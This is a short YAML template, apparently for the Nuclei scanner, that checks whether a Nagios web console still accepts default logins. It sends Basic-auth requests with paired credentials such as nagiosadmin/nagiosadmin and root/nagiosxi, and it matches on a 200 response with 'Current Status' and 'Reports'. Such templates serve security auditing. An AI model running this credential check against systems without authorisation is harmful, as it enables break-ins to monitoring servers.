id: nagios-default-login
info:
  author: d3sca
  name: Nagios Default Login
  reference: https://www.nagios.org
  severity: high
  tags: nagios,default-login
requests:
- attack: pitchfork
  matchers:
  - status:
    - 200
    type: status
  - condition: and
    type: word
    words:
    - Current Status
    - Reports
  matchers-condition: and
  payloads:
    password:
    - nagiosadmin
    - nagiosxi
    username:
    - nagiosadmin
    - root
  raw:
  - 'GET /nagios/side.php HTTP/1.1

    Host: {{Hostname}}

    Authorization: Basic {{base64(username + '':'' + password)}}

    '
